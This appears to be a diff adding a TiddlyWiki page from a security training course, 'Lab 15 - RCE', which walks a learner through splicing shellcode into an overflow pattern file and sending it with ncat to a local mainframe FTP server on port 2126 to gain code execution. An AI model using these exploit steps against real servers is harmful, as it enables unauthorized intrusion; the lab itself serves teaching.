@@ -1,0 +1,36 @@
+created: 20220804223858219
+modified: 20220804225526502
+tags: 
+title: Lab 15 - RCE
+type: text/vnd.tiddlywiki
+
+!! Copying Bytes
+
+# The last lab created the file `shellcode.bin`, open that file with your hex editor: `okteta shellcode.bin`
+# Select all the bytes in the file, and copy them
+# Open the pattern file `pattern5` with your hex editor: `okteta pattern5` 
+# In pattern 5 search for `Ae2A`. Replace it (and the other bytes) with the bytes you copied from shellcode.bin
+# Save this file as `pattern6`
+
+It should look something like this:
+
+[img[Screenshot_2022-08-04_15-46-24.png]]
+
+!! Exploit!
+
+Your FTP server should still be running on port 2126, time to exploit the FTP server and run our shell code
+
+# Exploit: `cat pattern6 | ncat -v -w1 localhost 2126`
+
+If you look now at the output from the master console you can see our code executed
+
+```
+/ +FTP00GI Connection from 172.17.0.1 - 17.44.10 2022/08/04
+/ +WTO
+/ IEF404I FTPDDC30 - ENDED - TIME=17.44.10
+```
+
+Congrats! You've done a mainframe RCE! You're part of a small handful of people in the world who could do this!
+
+
+[img[youdidit.jpg]]
